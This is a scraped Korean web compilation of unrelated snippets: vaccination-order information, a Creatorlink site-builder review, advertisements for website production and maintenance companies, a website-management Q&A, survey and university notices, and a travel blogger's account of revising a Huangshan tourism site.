있습니다.특정 연령대의 사람들의 예방 접종을 결정하는 방법은 무엇입니까? 개인의 나이는 생년월일 또는 예방 접종 당시의 나이를 기준으로 계산됩니까? 질병으로 인해 심각한 코로나바이러스 질병에 걸릴 위험이 없는 경우 백신 접종 차례는 연령에 따라 다릅니다. 가장 나이가 많은 그룹이 먼저 예방 접종을 받고 가장 어린 그룹이 예방 접종을 받습니다. 예방 접종 순서는 예방 접종 당시 각 개인의 연령을 기준으로합니다. 질병관리청 코로나19 예방접종 사전예약 시스템 누리집 홈페이지 예약관리 예방접종 증명서 확인서 발급 쿠브 사이트 실용적인 이유로 많은 지방 자치 단체에서는 모든 연령대의 사람들이 동시에 예방 접종을 받도록 권장합니다. 이 경우 같은 해에 태어난 모든 사람이 동시에 예방 접종을 받습니다. 백신 접종 확인서 증명서 발급하기 >> 백신 접종 확인서 크리에이터링크로 2월에 홈페이지를 처음 만들어 보고 사용하면서 좋은 점도 있고 불편한 점도 있는데 유지비가 적게 들고 마음데로 변경이 가능하여 몇개의 사이트를 만들어 봤어요.   컴퓨터만 켤줄 알면 누구나 쉽게 만들수 있다는데 네이버 모두 정도의 홈페이지를 직접 만들어 보았던 분이라면 쉽게 이용이 가능한 난이도인 것 같아요.​ 사용하면서 불편했던 점 1. 중간 중간 필요한 기능에 대한 설명이 부족하다. 각 요소의 기능에 대한 설명이 없어 블럭을 넣어서 확인해 보고 아니면 제거하는 방식을 취해야 해요. 2. 문의는 1:1 메신저만으로 가능한데 한번 문의를 주고 답변을 받으면 끝 ㅜㅜ 더 궁금한 점이 있으면 다시 1:1 메신저에 새 글을 써야한다. (이어서 메신저가 가능하다면 좋을텐데...) 3. 쇼핑형으로 변경한 사이트가 있는데 네이버 쇼핑 입점시 상품 db url 추출이 아직 되지 않아 네이버 쇼핑엔 들어갈 수 없다.(추후 기능을 업데이트 할 예정이라는데 언제 가능할지...ㅜㅜ)​​ 사이트를 만드는 방법은 지난번 포스팅을 참고해 주시고  크리에이터링크로 홈페이지 혼자 만들기!컴퓨터만 켤 줄 알면 누구나 쉽게 반응형 홈페이지를 만들수 있다고 하여 설 연휴 동안 크리에이터링크로 ...blog.naver.com  이번엔 몇가지 사용법에 대해 포스팅을 해 볼까 해요.  단종 제품 삭제하기 갤러리 쇼핑형에 제품을 올렸는데 단종이 되어 삭제하고 싶은데 어떻게 해야 할까요? 우선 사이트 편집모드에서 설정을 누르시고​  기본 설정의 컨텐츠 관리를 누르십니다. 블럭 설정에서는 여러 기능들을 설정할 수 있으니 한번씩 적용해 보시면서 원하시는 기능으로 설정하세요.    컨텐츠 관리에 한 묶음으로 올라가 있는 제품들이 있는데 그 중에서 삭제하고 싶은 제품을 클릭합니다.   그럼 순서도 변경이 가능하고 이동도 가능해요. 전 단종이 되었으니 삭제를 클릭합니다.   확인을 누르시면  단종된 제품만 없어졌어요.  마지막에 사이트 게시를 누르셔야 홈페이지에 적용이 됩니다. ^^ ​ 링크 걸기 내부 페이지나 외부 사이트 링크를 걸고 싶으실 땐 이미지일 경우엔 이미지 아래 링크 버튼을 누르시면 링크를 거실 수 있어요.(이미지에 마우스를 가져 가시면 링크 걸수 있는 버튼이 보여요.)  문장에 링크를 거실 땐 네이버 블로그 링크 걸기와 비슷하게 드레그 후 링크 걸기를 하실 수 있어요.  url 직접 입력도 가능하고 내부 메뉴 링크를 거실 수도 있습니다. 페이지 이동도 되고 새창으로 링크 페이지 이동도 가능해요. ​​ 홈페이지에 대한 지식이 많은 것은 아니라 설명이 부족한 부분이 있을 수 있지만 현재까지 사용하면서 필요했던 기능들에 대해 정리를 해 보았습니다. 기본적으로 홈페이지를 만드는 것은 정말 쉽고 무료로 200M까지는 가능하니 부담 없이 한번 만들어 보세요.  ​​ 베이직 기능의 홈페이지 구경하기엘지전자렌탈엘지전자 정수기, 공기청정기, 전기레인지, 스타일러, 건조기, 식기세척기 렌탈시 푸짐한 상품권을 드려요.lge.creatorlink.net  위 제품 정도로 홈페이지를 만들려면 기본제공 저장공간 200M로는 부족하니 베이직형은 선택하셔야 해요.  혹시 현재 직장에서 어떤 업무를 맡고 계신가요?​하시는 일에 홈페이지를 관리 업무를 하신다면 주목해주시기 바랍니다.​기업홈페이지제작 관리를 관리를 보다 더 편하게 하는 방법에 대해서 소개시켜 드리려고 합니다.​직원수가 적은 소규모 사업장이나 대표님 혼자서 근무하시는 1인 사업장의 경우에도 편하게 이용하실 수 있을거 같습니다.​알아보신분들은 아시겠지만 보통 기업홈페이지제작비용은 기본 100단위가 넘어가게 됩니다.어느정도 규모가 있는 곳이라면 괜찮을지 몰라도 1인기업이나 아직 규모가 적은 업체는 제작비용자체가 부담입니다.​오늘 제가 소개시켜드리는 곳은 전문가에게홈페이지 관리를 의뢰하면서 홈페이지를 무료로 제작하는 시스템입니다.​​   ​​먼저 홈페이지의 중요성은 아무리 강조해도 지나치지 않습니다.특히 기업홈페이지는 온라인 상에서 기업을표현하는 수단이기때문에 홍보는 물론이고기업의 특징까지 나타낼 수 있습니다.​​   ​​오늘 제가소개시켜 드리는 업체는 무료로기업홈페이지제작을 해주며, 사후관리를 서비스를해주는 업체 입니다.​사실 홈페이지는 아무리 멋지게 만들더라도만들고 나서 지속적인 관리가 되지 않는다면없는거 보다 못한게 됩니다.​그렇기 때문에 책임지고 홈페이지를 관리하는 담당직원이 필요합니다.​하지만 전문가를 따로 고용할 수 없는 상황이라면 전문 업체에 의뢰를 맡기게 되는데요 보통의 전문업체는 건당 비용이 발생하게 됩니다.​오늘 소개시켜 드리는 업체는 월에 3만원씩 고정으로 관리비를 내고 전담 관리를 맡길 수 있는 곳입니다.이때 홈페이지 제작 및 여러가지 소비스가 무료로 제공됩니다.​​무료 홈페이지 제작 자세히 알아봐기​​위 사이트가 오늘 소개시켜드린 업체 입니다.처음에 말씀 드렸듯 몇 백만원씩 들여서 제작을 하고 관리가 되지 않는 업체보다 비용이 들어가는지도 모를 정도의적은 금액으로 관리까지 맡길 수 있는 곳입니다.​이어서 조금 더 설명드려 보겠습니다.먼저 무료로 제공하는 서비스는 어떤게 있는지 확인해 보겠습니다.​   ​​위와 같이 기본적으로 기업홈페이지제작 및 모바일전용 홈페이지,도메인 등록, 백업서비스, 방화벽세팅 이 모든게 무료로 서비스 해주는 업체입니다.​이런서비스를 해주는 이유는 사후관리를 할때  백업이나 방화벽 같은 서비스들이 셋팅되어 있지 않으면어려운 부분이 생기기 때문이겠죠?​작은 부분까지 전부 신경써 주는 곳입니다.​​   ​​홈페이지제작업체는 어떻게 운영이 되는 것일까?​한달에 3만원씩 관리비용을 납부하면 홈페이지 수정은 물론 관리를 추가 비용없이 전문가가 낱아 관리를 해주는 곳입니다.​여기에 위에서 말씀 드린 서비스가 전부 무료로 제공 되죠​온라인상에서 기업의 이미지를 떨어뜨리지 않기 위해서는계속 강조드리지만 지속적인 관리입니다.​   ​​많이 찾아보신분들은 임대형 홈페이지도 확인하셨을지 모릅니다. 임대형 홈체이지와는 확연하게 차이가 나는데요​임대형업체의 경우 보통 100만원 정도 임대비용이 계약기간이 끝나고 다시 계약을 할때 마다 비용이 발생하게 됩니다.​그리고 소유권자체가 임대업체에 있으며 수정요청도 불가합니다.하지만 오늘 소개시켜드리는 업체는 임의수정은 물론 홈페이지 소유권까지 의뢰인한테 넘어가기 때문에추가적으로 들어가실 비용이 전혀 없으십니다.​혜택은 더 좋으면서 84%의 비용을 아끼실 수 있습니다.​​   ​​저희가 해당 업체에 의뢰를 할때 크게 느낀건 생각하지 못한 부분까지 신경써 준다는 것이었죠​기업홈페이지를 제작했는데 아무도 들어와서 확인하는 사람이 없다면 쓸모가 없겟죠​이곳은 구글이나 네이버와 같은 포털사이트에 홈페이지 등록까지 시켜줍니다.​만들기만 하는 업체와 달리 보다 더 노출이 잘 되기 위해서 신경써 주는 곳입니다.​​   ​​제가 의뢰하면서 느꼈던건 역시 경력이 많은 곳은 다르긴 다르다는 느낌을 받았죠 사실 처음에는 이제 막 생긴 업체가 이벤트를 하고있는건 아닐까 생각했어요 너무 조건들이 좋았기 때문에 그런 생각을 하게 되었는데요​운영한지 7년에 지금까지 제작한 홈페이지 수만 하더라도1만개가 넘는 홈페이지를 만들었다고 해요​그래서인지 제작과정에서 전문가와 상담을 할때 너무 만족 스러웠죠 말만하면 정확하게 딱 하고만들어 주시고 생각했던거 보다 훨씬 더 만족스러웠어요​​홈페이지 제작 자세히 알아보기​​자세한 내용은 위의 사이트에서 다시한번 확인해 보시기 바랍니다. ​이전에 다른업체에 의뢰를 하셨던 분이시라면 확연하게 차이를 느끼실 수 있으실거에요​해당업체에서 견적을 받아 보시고 다른 업체와 비교해보시면도움이 받으실 수 있으실거 같습니다.​​  ​   ​여기에 더불어서 홈페이지를 만드는 과정은어떻게 진행 되는지 살짝 설명 드려 볼게요​기업홈페이지뿐만 아니라 개인홈페이지 제작을 하시는 분들도 많이 늘고 있습니다.일반적인 제작 절차를 소개시켜 드릴게요​먼저 홈페이지에 올라가게 될 내용들을 분석하고 기획해야 합니다. 어떤 내용으로 회사 혹은 개인을소개할지 보는 사람으로 하여금 관심을 갖게 해야 합니다. 홈페이지에 올라가게 할 자료들을 평상시에 먼저 잘 수집하고 정리하는 노력이 필요합니다. ​이 과정을 잘 해야 보다 제작 후에 보다 더 잘표현할 수 있겟죠??​​이제 제작업체에서는 홈페이지 구조를 설계하게 됩니다.방문한 사람들이 원하는 정보를 빠르고 쉽게 찾을 수 있도록설계해야 합니다. 화면구성을 디자인 하는 단계라고 볼수 있죠어디에 어떤 버튼을 만들어 어디로 들어가게 할까?이런 내용들을 구상하는 단계인데요쉽게 말해 설계도를 그리는 작업이라고 할 수 있습니다.더 세분화 한다면 버튼은 어떻게 만들고배경색깔이나 사진은 어떤게 좋을지 설계하는 작업이겠죠?   내용들과 설계가 되었다면 이제 홈페이를 만들기 시작하는데요  홈페이지를 만들때는 HTML을 사용해서제작합니다. 여기에 더해져 이미지를 만드는 포토샵과 같은프로그램을 사용하게 됩니다.​HTML의 경우 전문가가 아니라면 어려운부분이기 때문에 전문가의 손길이 가장 많이 요하는 작업이라고 할 수 있죠요즘에는 미리 제작해 놓은 툴을 이용할 수 있게 해서개인들도 쉽게 만들수 있는 서비스들이 있습니다하지만 획일화 된 똑같은 디자인으로만 만들 수 있기 때문에 기업홈페이지에는 어울리지 않죠 쉽게 말하면 블로그 같은 느낌???​제작이 완성 되었다면 이제 온라인 상에서 누구나 접속할 수 있게 해야 하겠죠?웹서버의 공간을 확보한 후 문서를 올려야 하는데 어느정도 수준 규모의 공간을 확보하는게 좋습니다.그 후에 웹서버 공간에 제작한 홈페이지를 업로드 하는 것이죠   여기서 서버는 요청자들이 어떠한 요청을 했을때 응답을 하는 역할을 합니다즉 우리가 어떤 홈페이지에 들어가서 버튼을 눌러 해당페이지로 들어가 달라고 하는 요청을 했을때 그에 대한 답변을 하는 역할 입니다.​언제 어떤 요청자가 요청을 할지 모르기 때문에 항상 24시간 응답할 준비가 되어 있어야 합니다.​이렇게 홈페이지 제작업체에대해 추천드리고 제작과정에 대해간단하게 설명 드렸습니다.감사합니다~~ ​질문인터넷 홈페이지 관리하는 사람​인터넷 홈페이지를 만들어서 데이터랑 서버 관리까지 등등,,, 홈페이지 운영은 한사람이 할 수 있는 일 인가요..?​물론 접속 인원수가 많아지게되면, 직원이 필요한 것은 알지만,​우선 기본적인 홈페이지 돌아가는 기능까지(화원들이 로그인해서 게시판에 글을 적고 서로 채팅을 할 수 있는 기능까지) ​혼자 할 수 있는 일인지 궁금합니다. 이쪽 분야에 지식이 없다보니..​이렇게 홈페이지 운영하는 사람은 직업군에서 “홈페이지 관리자” 인가요? 좀더 전문 적인 용어는 없나요?​그리고 모바일에서 쓰여지는 어플들 컴퓨터에서 동시에 사용하는기능이 있나요?​예를들어, , 영어배우는 어플을 , 저의 홈페이지에 넣어서 컴퓨터 홈페이지에서도 이용할 수 있는 방법은 있나요?​​답변안녕하세요. 홈페이지 운영과 서버 관리에 대해 질문해 주셨네요.​먼저 홈페이지 서버 관리는 24시간 열려 있어야 하기 때문에 365일 24시간 서버 관리가 필요합니다.​혹시라도 다운이 될 경우에 바로 조치를 해야 하기 때문입니다.​따라서 24시간 관리를 해주는 웹서버 업체에 의뢰를 하며, 큰 사이트의 경우에는  IDC 센터에 의뢰를 합니다.​정말 큰 사이트의 경우에는 자체 직원을 교대로 근무시키며 관리하기도 합니다.​다음으로 홈페이지 운영 관리는 새로운 상품이 출시되거나, 직원이 변경되거나 혹은 회사가 이전을 하게 되는 등의 ​변화에 따라 홈페이지를 수정해야 하기 때문에 회사가 운영되는 한 계속해서 홈페이지 관리는 필요합니다.​이런 수정을 하려면 수정사항을 디자인하는 웹디자이너, 디자인을 웹문서로 만들어주는 웹퍼블리셔,​웹문서에 기능을 넣어주는 웹 개발자 등의 여러 인력이 필요합니다.​이런 인력을 직원으로 고용하려면 인건비가 많이 들기 때문에  보통의 경우에는 홈페이지 관리 업체에 의뢰하거나 ​혹은 웹디자이너만 고용하고 능력 외의 수정 부분만 관리 업체에 의뢰하기도 합니다.​질문자님 말씀처럼 이들을 홈페이지 관리자라 부르는 것도 맞습니다.​좀 더 구체적인 인력은 웹디자이너, 웹퍼블리셔, 웹개발자라고 부릅니다.​감사합니다.​  ​http://www.adcomm.kr/ 에이디커뮤니케이션홈페이지제작,반응형홈페이지제작,쇼핑몰제작,모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,각종 솔루션 제작,인천홈페이지제작 전문업체.www.adcomm.kr  ​남들 다하니까 왠지 해야 할 것 같은 홈페이지 제작! 사실 지금의 홈페이지는 하나의 개인 공간으로서 활용하기 보다 마케팅에 더욱 집중되어 있는 것이 사실입니다. 또 그만큼 효과를 보고 있고 말이죠. 병원, 음식점 같은 업종들도 굳이 인터넷에 홈페이지를 제작하고 관리하는 이유는 결국 사업을 하기 위함입니다. 사람들에게 광고를 해야 찾아올 테니까요. 홈페이지에서 제공되는 모든 정보들이 자연스럽게 홍보로 이어지게 됩니다. 그만큼 또 현대의 소비자들은 모든 정보를 인터넷에 의존하고 있어요. 오늘날 홈페이지 제작 명분은 소비자들의 변화라는 충분한 명분이 있습니다. 에이치엘스토리에서는 홈페이지를 처음부터 제작해드리고 홍보도 함께 해드리며 홈페이지관리업체로서도 확실한 결과물을 약속드립니다.​​​  ​에이치엘스토리는 단순히 홈페이지관리업체라고 정의할 수 없습니다. 홈페이지 관리는 저희가 할 수 있는 수많은 작업 중 하나입니다. 고객님의 요청에 맞게 홈페이지를 기획하여 제작하고 홍보, 관리 모든 작업을 할 수 있을 만큼 기술력과 제작 환경을 제대로 보유하고 있습니다. 제작 이전에 저희는 기획에 많은 시간을 투자합니다. 홈페이지라는 게 하루아침에 뚝딱 만들어지는 것이 아니고 장시간 동안 많은 기술자들이 수정과 보완을 거치면서 제작을 하는 것이기에 기획이라는 플랜이 없으면 그 결과물의 퀄리티는 어정쩡할 뿐이고 쓸데없이 작업 기간만 늘어나게 되니까요. 어떤 컨셉의 홈페이지를 만들 것이며 어떠한 기술이 필요하고 제작 이후 홈페이지에 대한 홍보 방식과 유지 보수 시스템 구축 모든 것을 기획 단계에서 각 팀들이 함께 회의를 하여 정합니다. ​​​  ​에이치엘스토리는 언급하였듯 홈페이지관리업체로나 제작 업체로나 출중한 실력과 퀄리티를 약속드릴 수 있습니다. 기획팀, 미디어팀, 디자인팀, 홍보팀, 유지 보수팀, 디자인팀과 같은 기술자들이 팀을 이루어 운영되고 있으며 각종 촬영 장비, 편집 시설, 스튜디오 등의 제작환경도 제대로 구축되어 있죠. 이렇게 탄탄한 제작 환경은 합리적인 홈페이지 가격과 출중한 퀄리티로 귀결됩니다.​​​  ​제작을 하고자 하시는 분들은 가격에 민감할 수밖에 없습니다. 사실 홈페이지 제작은 쉽지도 않은 만큼 가격도 저렴하다고 볼 수 없죠. 그렇다고 저렴하게 제작을 못한다는 것도 아닙니다. 조금만 찾아보시면 터무니없을 정도로 저렴한 가격에 제작을 해준다는 업체는 정말 많습니다. 하지만 그 가격에는 이유가 있는데요. 30만 원에 제작을 하면 30만 원짜리의 퀄리티가 나오는 것은 당연한 겁니다. 단순히 홈페이지관리업체,제작업체를 선정할 때 가격만을 두고 보면 안 되는 게 이 때문입니다. ​​​  ​시장에는 어떠한 제품, 서비스를 두고 이 정도는 되어야 한다는 암묵적인 관념이라는 게 존재합니다.  홈페이지 퀄리티를 논할 때 이 부분에는 이런 게 있어야 하고 어떠한 것이 마이너스 요소라며 꼬장 꼬장하게 잣대를 들이댈 필요 없이 누구나 보면 어떠한 정도는 되어야 한다는 기준이 존재하죠. 가격만을 두고 업체를 선정하게 되면 제작만 했다 뿐이지 퀄리티로나 뭐로나 만족할 수 있는 것은 없을 겁니다. 또한 이러한 가격은 이후의 홈페이지 관리나, 홍보도 없을 확률이 매우 높습니다.​​​  ​저희는 홈페이지 관련 작업을 자체적으로 해결할 수 있는 기술력과 환경 모든 것이 갖추어져 있습니다. 프리랜서,외주업체를 일절 사용하지 않고 회사 내에서 엄격하게 관리하여 여러분들에게 제공하는 만큼 그 퀄리티는 언제나 일정하고 저희 회사만의 컬러를 담고 있으며 합리적이고 거품이 없는 가격을 약속드립니다.​​​    ​홈페이지 제작 이후 자체적인 홍보는 상위 노출 방식으로 진행됩니다. 기존의 홍보는 되도록 많이 노출한다는 1차원적인 접근이 많았지만 저희는 홈페이지를 이용하는 주 고객층을 파악하고 그들이 홈페이지로 자연스럽게 방문을 할 수 있도록 다양한 키워드들을 빅데이터로 조사하고 분석합니다. 해당 키워드들을 기반으로 검색 결과에 자연스럽게 노출되도록 기획하여 작업하고 있습니다.​​​   ​1:1 유지 보수 담당자들이 여러분들에게 전담 배치됩니다. 작업에 대한 보고, 디자인 변경 등의 피드백을 카카오톡이나 이메일, 전화로 주시면 즉시 답변드리고 관리해드립니다. 불안정한 온라인 환경에 맞게 트래픽, 오류 등의 기술을 요구하는 문제들 역시 저희 유지보수팀들이 빠르게 체크하여 처리합니다.​​​  ​  ​홈페이지관리업체 에이치엘스토리! 제작과 홍보, 유지 보수 등 홈페이지에 필요한 모든 작업을 저희가 확실한 퀄리티로 해결해드리겠습니다!​더 자세한 정보는 아래의 홈페이지나 전화로 문의하세요!​홈페이지 바로 가기 클릭전화상담 바로 가기 클릭1588-1815 중랑구시설관리공단 대표 홈페이지에 대한 이용 만족도 조사를 진행하여 서비스 이용의 불편점을 개선하고자 합니다.주민 여러분의 목소리를 반영하여 더 나은 홈페이지로 만들어가겠습니다.소중한 의견 부탁드립니다.  ​                                                                   ■ 설문기간 : 2021.7.12.(월) ~ 7.25.(일)까지 2주간                                                                   ■ 설문대상 : 중랑구시설관리공단 홈페이지 이용자                                                                   ■ 설문내용 : 개편된 공단 통합 홈페이지 제공 정보 이용자 만족도                                                                    ■ 설문방법 : 온라인 설문조사    ​​▼ 설문조사 참여하기 (이미지 클릭) ​   홈페이지의 중요성이 다시 재조명되고 있습니다. 홈페이지는 인터넷이 본격적으로 시작되고부터 만들어졌으며 지금의 모든 플랫폼의 원조이나 뿌리라고 할 수 있습니다. 한마디로 기본 중에 기본이죠. 그렇다 보니 동시에 왜 만들어야 하는지에 대한 이유가 묻혀버리게 되고는 하죠. 너무 기본적인 것이다 보니 일단 만들기는 만드는데 이걸로 어떻게 활용을 해야 하는지는 잘 모릅니다. 다른 만드니까 만드는 거죠. 인터넷과 함께 시작을 하였다고는 하지만 홈페이지의 영향력이 제대로 재조명되고 주목받는 것은 인터넷 마케팅이 본격적으로 시작된 이후라고 할 수 있습니다. 인터넷은 기본적으로 익명성이 보장됩니다. 제가 이 글을 쓰고 있고 여러분들이 보고 있지만 재가 누군지 얼굴은 어떻게 생겼고 성별은 어떤지에 대해 알 수 없죠. 개인의 정보를 철저하게 가려주는 익명성의 힘으로 인터넷은 누구나 부담 없이 글을 쓰고 정보를 공유하게 되면서 짧은 시간에 엄청난 영향력을 가지게 됩니다.    그러나 빛이 있으면 그림자도 있듯이 이 익명성 때문에 정보에 대한 신뢰가 땅에 떨어지기도 쉽습니다. 누구나 쓸 수 있고 책임을 지지 않다 보니 허황된 정보를 진실인 양 말로 속이고 물품을 주고받았는데 엉뚱한 물품이 온다든지 사기들이 많죠. 인터넷에서 마케팅을 하고 제품을 판매하기 위해서는 언제나 이 익명성 때문에 생기는 신뢰성이 가장 중요합니다. 홈페이지는 기본적으로 제품과 브랜드에 대해 더욱 자세한 정보를 제공해주고 공식적인 홈페이지의 정보 제공을 통해 쉽게 변질되는 정보를 사전에 막아줍니다. 예약, 게시판 문의 등의 편의성도 제공해주죠. 그리고 이 모든 것들을 가능하게 하는 홈페이지의 존재 자체가 제품과 브랜드에 대한 신뢰를 만들어 줍니다. 저희 에이치엘스토리는 홈페이지 제작부터 홈페이지관리 ,홍보 까지 모든 것을 철저한 기획 아래 탄탄한 구성으로 만들고 관리, 홍보해드립니다.    홈페이지관리,홍보, 제작 모든 것을 에이치엘스토리에서 한 번에 해결하실 수 있으며 제작 기간은 평균적으로 4개월이 소모됩니다. 모든 작업을 저희에게 맡기셔도 상관은 없으나 여러분이 생각하는 전체적인 홈페이지의 이미지, 방향성과 같은 확실한 정보, 피드백을 주신다면 퀄리티는 더욱 올라가고 제작 기간 역시 더욱 짧아질 수 있습니다.          저희는 비주얼은 물론 기술적인 편의성까지 놓치지 않습니다. pc 규격에 맞게 제작되는 홈페이지는 모바일과 태블릿 같은 환경에서는 크기부터 맞지 않아 보기가 힘들죠. 저희는 어떠한 접속 환경에서도 그 규격에 맞게 자동으로 맞추어 주고 스마트폰과 같은 상대적으로 작은 화면에서는 인터페이스를 더욱 심플하게 바꾸거나 확대를 하는 등 맞춤형/반응형 홈페이지 스타일로 제작해드리고 있습니다.  눈에 보이는 비주얼은 물론 편의성까지 절대 놓치지 않습니다.       ' 위 의 이미지는 에이치엘스토리가 제작하고 관리 홍보를 하고 있는 홈페이지 이미지입니다. 각 기 다른 분야에 맞게 새로운 디자인으로 제작해드립니다 '      홈페이지관리는 너무나 중요한 사항입니다. 관리가 되지 않고 방치되는 홈페이지는 금방 티가 나기 마련이죠. 이러한 홈페이지는 절대 소비자에게 신뢰를 얻을 수 없습니다. 전반적인 홈페이지의 수정 사항과 같은 기본적인 관리 역시 해드리고 트래픽 초과, 홈페이지 접속 불가와 같은 기술적인 문제 역시 저희가 사전에 방지를 하고 신속하게 처리해드립니다.    홈페이지관리는 잡초를 처리하는 것과 같이 꾸준하게 해야 합니다. 업무와 홈페이지 관리까지 함께 병행하는 것은 사실상 무리라고 할 수 있죠. 그러니 저희와 같은 전문적인 업체에게 안심하고 맡기시기 바랍니다.      홈페이지관리 ,제작, 홍보 모든 것을 하는 데 있어서 저희는 회사 자체적인 기술력만을 사용합니다. 다른 업체에게 일부 작업을 하청하는 일이 없습니다. 그래서 가격 역시 거품이 없고 저렴하고 합리적이죠.   홈페이지 제작, 기술적인 편의성과 저렴하고 확실한 유지 보수, 마케팅 이 모든 것들을 에이치엘스토리에서 확실한 퀄리티로 받아 보실 수 있습니다. 더욱 자세한 정보를 원하신다면 아래의 홈페이지와 전화로 문의하시기 바랍니다!​▶ 홈페이지 바로 가기 클릭 ◀​▶ 연락처 바로 가기 클릭 ◀1588-1815 <한국인의 황산 여행 증진 방안에 대한 보고서>에서 자유베낭여행객이 황산으로 찾아오게 하려면오는 방법과 황산에 대한 원하는 정보를 쉽게 찾을 수 있도록 하는 것이 관건이라고 한 부분이 있다.이미 황산의 패키지 여행은 많이 알려져 있고 국내 여행사에사도 홍보를 많이 하는 걸로 알고 있다실제로 여기 직원들도 한국인 단체 관광객을 하루에도 몇 팀씩 상대한다고 하고나도 황산갈 때 마다, 호텔에서 조식먹을 때마다 곳곳에서 패키지로 온 팀을 많이 봐왔다. 보고서에서 패키지여행과 베낭여행으로 나눠 내용을 전개했는데아직 자유 베낭여행이 활성화 되지 못한 이유와 그 해결방안에 촛점을 두었다.무엇보다 직항비행기가 없고 기차도 발달하지 못했는데 오는 교통편에 대한 정보가 불명확한 것,황산은 들어서 아는 사람이 많고 관심이 많은데 패키지를 통해서가 아니라 개인적으로는 실질적인 여행정보를 찾기가 쉽지 않다는 것을 가장 큰 두 가지 이유로 꼽았다.보통 여행 전 가이드 북과 인터넷 카페나 관련 사이트를 통해 정보를 찾고 계획을 잡는다.황산관광공사는 직접 운영하는 홈페이지 관리,인터넷 예약을 담당하는 회사가 있음에도 부실하고 업데이트가 돼 있지 않은 한국어판의 개선이 시급하다고 강조했다. 이 대표 사이트를 효율적이고 실질적인 정보제공 통로로 만들어 여행을 준비하는 사람 스스로가 쉽게 이 곳에서 원하는 정보를 얻을 수 있다면 큰 도움이 될 것이다. 이 보고서를 보고 대표총재가 바로 홈페이지 개선에 들어가라고 지시를 내렸단다.여행사 와서 3일만에 툰시 중심 老街에 있는途馬(황산관광공사 홈페이지관리) 전자 공사로 일주일간출근하며 홈페이지 한국어판 개선과 번역 등을 돕게 되었다.메뉴를 새로 짜고 실제로 필요한 정보가 들어갈 수 있도록 바꿔야 할 것 같다. 아.. 그런데 도저히 며칠만에 다 할 수가 없다.- 교통(대도시-황산, 황산 시내, 황산 주변, 황산)- 지도(도시간, 황산 시, 황산 관광가이드 지도)- 명승지, 추천 노선- 가격 별, 특징 별, 위치 별 숙소와 식당 소개- 여행 팁(계절 별 특징, 주의 사항, 예산관련 등)- 특산품, 휘주 문화 등 소개 을 카테고리로 해서 내용을 넣으려고 하는데 반 정도 하다가 한국 갈 때가 되어버렸다....좀 나아지긴 했지만 아직 할 게 많이 남았는데-_-  돌아와서 틈틈이 자료 주기로 했다www.huangshan.com.cn          ​홈페이지를 처음 만드는 것도 중요하지만 꾸준한 운영도 무척 중요합니다.아무리 예쁜 홈페이지라도 방치하다 보면 먼지가 쌓이기 마련입니다.​홈페이지를 쓰다 보면 최신 내용으로 업데이트하는 등 수정할 일이 생기게 되는데요.제작 이후 일어나는 여러 가지 문제들을 해결하고 꾸준히 운영하기를 원하신다면 홈페이지 관리 업체 서비스를 이용할 수 있습니다.​   ​홈페이지 관리 업체 서비스를 유지 보수라고 표현하기도 하는데요.​ 유지 보수[維持補修]시스템을 항상 최상의 운전 상태로 유지하기 위한 각 장치의 시험, 조정, 수리, 복구 따위의 작업. [출처] 국립국어원 우리말샘​직접 해결하기 여러운 문제들을 전문가를 통해 쉽고 빠르게 해결할 수 있는 장점이 있습니다.​   ​"오타를 발견했어요!""사진을 바꾸고 싶어요!""내용을 추가하고 싶어요!""프로그램이 오류가 나요!"​홈페이지를 만든지 꽤 오래되었다면 한 번쯤 고민되는 문제입니다.홈페이지의 디자인이나 콘텐츠가 10년 전과 동일하다면 과연 소비자의 관심을 얻을 수 있을까요?​   ​홈페이지도 하나의 매장 혹은 회사로 생각해야 합니다.소비자에게 보여지고 기업의 이미지를 느끼게 해줄 수 있는 홈페이지 관리 업체가 적지 않은 중요성을 차지합니다.홈페이지에 대한 지속적인 관심은 신뢰감을 주고 살아있는 홈페이지로 사용자에게 믿음을 줍니다.​   홈페이지 관리 업체가 필요한 이유​1. 고정 인력에 대한 인건비 감소2. 전문가의 효율적인 운영3. 생동감 있고 안정적인 사이트 유지4. 디자인 변경, 기능 개선 등 상시 업데이트 가능​   ​홈페이지 관리는 당연 선택이 아닌 필수입니다.항상 최신으로 단장하여 소비자를 맞이할 준비를 한다는 것이 결코 사소한 일은 아니겠죠?​제대로 된 관리가 없다면 그 사이트는 항상 경쟁사보다 한발 늦게 될 것입니다.매장을 새 단장하는 것처럼 홈페이지 역시 요구에 맞게, 시장의 흐름에 맞게 신속하고 부지런히 관리해야 합니다.그 작은 습관이 큰 차이를 벌릴 것입니다.​   ​제작보다 더 중요한 건 지속적인 홈페이지 관리 업체 선정!지속적으로 신뢰감을 주고 생동감 있는 사이트를 만들어가기 위해서는 체계화되고 전문적인 관리가 필요합니다.​외주 업체에게 유지 보수를 맡길 땐 그 기간과 범위를 꼼꼼히 확인해야 합니다.서비스가 적용되는 범위는 디자인, 기능, 오류 영역이라고 볼 수 있습니다.​   홈페이지 관리 업체 서비스 작업 단계수정사항 발생 - 유지 보수 접수 - 내용 확인 - 작업 및 처리 - 처리 확인 - 완료​   ​에이디커뮤니케이션에서 운영에 필요한 다양한 부가 서비스를 제공하여 안정적이고 경쟁력 있는 사이트를 지원합니다!편리한 서비스로 쉽고 빠르게 홈페이지를 운영해보세요.​- 약정 유지 보수 관리(월 단위 평균 업무를 도출하고 매월 혹은 1년 단위의 계약을 통해 보다 안정적이고 빠른 업무 처리, 저렴한 비용 지원)- 건별 유지 보수 관리(호스팅 서비스만으로 웹사이트를 유지하며, 필요시에 업무 요청 건에 대하여 비용을 산출하여 업무 지원)​전통과 기술의 홈페이지 정비소.합리적이고 빠른 일처리로 고객의 선택에 후회 없도록 항상 노력하고 있습니다.​   ​홈페이지 관리 업체에 대해 더 자세히 알고 싶은 분들은 에이디커뮤니케이션 공식 홈페이지를 찾아주세요!​https://www.youtube.com/watch?v=Q-0tmxEpIh8 ​*​궁금한 점은 언제든지 문의를 남겨두세요.최선을 다해 답변해드리겠습니다.​1566-8667http://adcomm.kr 에이디커뮤니케이션홈페이지제작,무료 모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,인천홈페이지제작.adcomm.kr ​  기획처(처장 정해용)는 지난 25일 ‘2019학년도 우수관리 학부(과) 및 전공홈페이지’를 발표하고 관리자를 시상했다고 27일 밝혔다.​지난해 우수 사례로 선정된 학과는 비서행정학과(김보미 조교), 물리치료학과(김동균조교)로 꾸준한 게시판 관리, 정보업데이트 등이 좋은 평가를 받았다.기획처는 학부(과)홈페이지 활성화를 위해 학과홈페이지 관리자교육을 년 